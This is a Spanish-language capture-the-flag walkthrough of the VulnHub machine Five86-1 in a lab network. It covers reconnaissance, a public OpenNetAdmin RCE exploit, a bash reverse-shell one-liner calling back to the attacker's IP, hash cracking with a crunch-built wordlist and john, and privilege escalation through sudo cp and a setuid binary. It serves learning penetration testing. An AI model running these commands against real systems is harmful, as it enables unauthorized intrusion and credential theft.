# Five86 VulnHub

- Ip atacante - 10.0.2.4
- Ip victima - 10.0.2.20

##Empezamos

Comencemos con un scaneo rapido de nmap

```
❯ sudo nmap -Pn -sS --open -n -A -p 22,80,10000 10.0.2.20
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 23:16 EST

Nmap scan report for 10.0.2.20
Host is up (0.00025s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 69e63cbf72f7a000f9d9f41d68e23cbd (RSA)
|   256 459ec71e9f5bd3cefc1756f2f642abdc (ECDSA)
|_  256 ae0a9e92645f8620c41144e05832e505 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/ona
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 08:00:27:F0:D2:1D (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 10.0.2.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.41 seconds
```

Luego de eso me dirigi a ver la pagina en el puerto 80 la cual estaba en blanco
Entonces procedi a buscar directorios ocultos.

```
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.20 -x .html,.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.20
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,txt
[+] Timeout:                 10s
===============================================================
2023/03/01 23:17:14 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 30]
/reports              (Status: 401) [Size: 456]
/robots.txt           (Status: 200) [Size: 29]
/.html                (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
Progress: 651555 / 661683 (98.47%)
===============================================================
2023/03/01 23:17:47 Finished
===============================================================
```
Lo que encontre dentro de los directorios fue lo siguiente:
#####/robots
```
User-agent: *
Disallow: /ona
```
#####/reports
sign in / log in

#####/ona
Encontramos que la version que usan es © 2023 OpenNetAdmin - v18.1.1
De tal forma que me dispuse a buscar un exploit para el ONA

https://github.com/amriunix/ona-rce/blob/master/ona-rce.py

Lo copie, lo ejecute y me hice una reverse shell

```
python3 exploit.py exploit http://10.0.2.20/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[-] Warning: Error while connecting o the remote target
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh$ bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'
```
Me puse en escucha y procedi a mejorar la shell a una shell inteligente
```
❯ nc -lvnp 443     
listening on [any] 443 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.20] 59888

www-data@five86-1:/opt/ona/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null

www-data@five86-1:/opt/ona/www$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                               
~/Documents/five86                                                          
❯ stty raw -echo;fg
[1]  + continued  nc -lvnp 443

www-data@five86-1:/opt/ona/www$ export TERM=xterm SHELL=bash 
```
Ya teniendo la shell mejorada procedo a ver los archivos y existe un .htaccess.example el cual dice algo interesante

```
www-data@five86-1:/opt/ona/www$ cat .htaccess.example 
##########################################
# This is the default .htaccess file for ONA.
[...]
# You will need to create an .htpasswd file that conforms to the standard
# htaccess format, read the man page for htpasswd.  Change the 
# AuthUserFile option below as needed to reference your .htpasswd file.
# Keep in mind that this password is not necassarily the same password
# that a particular user would use to access the web interface.  User
# names, however, do need to be the same in both the .htpasswd and web
# interface.
[...]
##########################################

# You can choose to use the IP filter, password or both for authentication.
<Files dcm.php>

    ###############################
    # This section allows you to filter based on IP client addresses
    ###############################
    Order Deny,Allow
    Deny from all
    #Allow from 10.0.0.0/8
    Allow from 127.0.0.1
    ###############################

    ###############################
    # This section allows you to force a password
    # Change the AuthUserFile path as needed
    ###############################
    #AuthUserFile /opt/ona/www/.htpasswd
    #AuthName "dcm.pl access"
    #AuthType basic
    #Require valid-user
    ###############################
</Files>
```

Basicamente el archivo dice que existe un .htpasswd asi que procedo a buscarlo

```
www-data@five86-1:/opt/ona/www$ find / -name .htpasswd 2>/dev/null
/var/www/.htpasswd
```

Ya dentro de la maquina me dirigo a leer el .htpasswd
```
www-data@five86-1:/var/www$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Jan  1  2020 .
drwxr-xr-x 14 root root 4096 Jan  1  2020 ..
-rw-r--r--  1 root root  202 Jan  1  2020 .htpasswd
drwxr-xr-x  3 root root 4096 Jan  1  2020 html

www-data@five86-1:/var/www$ cat .htpasswd 
douglas:********************qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt 
```

Entonces lo que nos dice es que si vamos a realizar fuerza bruta un diccionario comun y corriente va a fallar. Para esto usaremos la herramienta de crunch que nos permite crear diccionarios personalizados.

Palabra a utilizar ``aefhrt``

```
~/Documents/five86
❯ crunch 10 10 aefhrt -o wordlist_five.txt
Crunch will now generate the following amount of data: 665127936 bytes

634 MB
crunch: 100% completed generating output
                                                                             
~/Documents/five86
❯ ls 
exploit.py  wordlist_five.txt
```

Debido a que el wordlist que creamos es muy grande llevaria dias hacer el ataque de fuerza bruta. Para esto retiramos del wordlist las lineas que no contengan todas las letras para disminuir el tamaño del wordlist

```
❯ awk '/a/&&/e/&&/f/&&/h/&&/r/&&/t/' wordlist_five.txt > wordlist_five_small.txt
```

``'/a/&&/e/&&/f/&&/h/&&/r/&&/t/':`` busca las líneas que contienen todos estos caracteres
``wordlist_five.txt:`` lee el archivo wordlist.txt que generaste con crunch
``wordlist_five_small.txt:`` redirige el resultado a un nuevo archivo llamado wordlist_five_small.txt

Otra solucion que encontre es con la herramienta grep 
```
❯ grep -P "(?=.*a)(?=.*e)(?=.*f)(?=.*h)(?=.*r)(?=.*t)" wordlist_five.txt > small_word.txt
```
Las dos formas funcionan igual de bien :)
Ahora si comparamos tamaños hay una mejora muy grande

```
❯ ls -la 
total 1002672
-rw-r--r--  1 kali kali 180789840 Mar  2 11:02 small_word.txt
-rw-r--r--  1 kali kali 180789840 Mar  2 10:58 wordlist_five_small.txt
-rw-r--r--  1 kali kali 665127936 Mar  2 10:46 wordlist_five.txt
```

Ahora si continuamos e intentamos obtener la clave de douglas con john

```
❯ john douglas_hash --wordlist=wordlist_five_small.txt      
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*******rrr       (?)     
```

Ahora si con la contraseña logramos entrar al directorio de ``/reports``
Entrando no encontre nada entonces intente entrar por el puerto 22 ssh

```
❯ ssh douglas@10.0.2.20
```
Ahora dentro de la maquina vemos que tenemos varios usuarios
```
douglas@five86-1:/home$ ls
douglas  jen  moss  richmond  roy
```
Lanzamos el comando ``sudo -l``
```
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
```

Ahora intentamos cambiar de usuario hacia jen

Ya que ``jen`` puede copiar sin password entonces copiamos nuestra clave publica
```
❯ cat /home/kali/.ssh/id_rsa.pub                    
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpNaDYHFQg0lTIc1Uw5ix/\4byPKQO8yoeNRrNSGOHE8QER314ttRlB/V/\meQtokPQV9Q542XE4bhbRh7D3MA85TI/\FNuxHUNFNm5XttGPHSRzRoLW3h6YxzJedtNVeQ5r7xuRauiy1EWzW/\nzeCcFs2WCmO7SZPiNZKTiG3qVYwTMTem2ZK[...]
```

Luego las copiamos donde douglas

```
douglas@five86-1:~$ cat id_rsa_mine.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpNaDYHFQg0lTIc1Uw5ix/4byPKQO8yoeNRrNSGOHE8QER314ttRlB/V/meQtokPQV9Q542XE4bhbRh7D3MA85TI/FNuxHUNFNm5XttGPHSRzRoLW3h6YxzJedtNVeQ5r7xuRauiy1EWzW/nzeCcFs2WCmO7SZPiNZKTiG3qVYwTMTem2ZK[...]
```

Las mandamos al temporal y las enviamos a los authorized_keys de jen

```
douglas@five86-1:~$ cp id_rsa_mine.pub /tmp
douglas@five86-1:~$ sudo -u jen cp /tmp/id_rsa_mine.pub /home/jen/.ssh/authorized_keys
```

Ahora en nuestra maquina entramos sin contrasena como el usuario jen 

```
❯ ssh jen@10.0.2.20             
[...]
You have new mail.
Last login: Thu Mar  2 11:26:27 2023 from 10.0.2.4
jen@five86-1:~$ 
```

Entrando nos dice que tenemos un nuevo correo asi que buscamos la palabra mail

```
jen@five86-1:~$ find / -name mail 2>/dev/null
/var/spool/mail
/var/mail
/usr/bin/mail
/usr/share/webmin/authentic-theme/extensions/mail
/etc/alternatives/mail
You have new mail in /var/mail/jen
```

```
jen@five86-1:/var/mail$ cat jen 
From roy@five86-1 Wed Jan 01 03:17:00 2020
[...]
Hi Jen,

As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.
But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now F*********

Moss will understand (ha ha ha ha).
```

Vemos que nos da las credenciales de Moss asi que nos conectaremos como Moss

```
jen@five86-1:~$ su moss
```

```
moss@five86-1:~$ ls -la
total 12
drwx------ 3 moss moss 4096 Jan  1  2020 .
drwxr-xr-x 7 root root 4096 Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    9 Jan  1  2020 .bash_history -> /dev/null
drwx------ 2 moss moss 4096 Jan  1  2020 .games
moss@five86-1:~$ cd .games/
moss@five86-1:~/.games$ ls -la
total 28
drwx------ 2 moss moss  4096 Jan  1  2020 .
drwx------ 3 moss moss  4096 Jan  1  2020 ..
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 battlestar -> /usr/games/battlestar
lrwxrwxrwx 1 moss moss    14 Jan  1  2020 bcd -> /usr/games/bcd
lrwxrwxrwx 1 moss moss    21 Jan  1  2020 bombardier -> /usr/games/bombardier
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 empire -> /usr/games/empire
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 freesweep -> /usr/games/freesweep
lrwxrwxrwx 1 moss moss    15 Jan  1  2020 hunt -> /usr/games/hunt
lrwxrwxrwx 1 moss moss    20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 nsnake -> /usr/games/nsnake
lrwxrwxrwx 1 moss moss    25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 petris -> /usr/games/petris
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 snake -> /usr/games/snake
lrwxrwxrwx 1 moss moss    17 Jan  1  2020 sudoku -> /usr/games/sudoku
-rwsr-xr-x 1 root root 16824 Jan  1  2020 upyourgame
lrwxrwxrwx 1 moss moss    16 Jan  1  2020 worms -> /usr/games/worms
```

```
moss@five86-1:~/.games$ file upyourgame 
upyourgame: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=391189d61024b35dd29857e0c206c7b93023129e, not stripped
moss@five86-1:~/.games$ ./upyourgame 

Would you like to play a game? Yes
Could you please repeat that? yes
Nope, you'll need to enter that again. ok
You entered: No.  Is this correct? no
We appear to have a problem?  Do we have a problem? yes
Made in Britain.
# id
uid=0(root) gid=1001(moss) groups=1001(moss)
# bash
root@five86-1:~# cd /root
root@five86-1:/root# cat flag.txt
***************00593da4522251746
```

Con esto completamos la maquina de five86
Estuvo buena sobre todo la parte de pivotear entre usuarios al final
y me permitio practicar la creacion de diccionarios personalizados :D






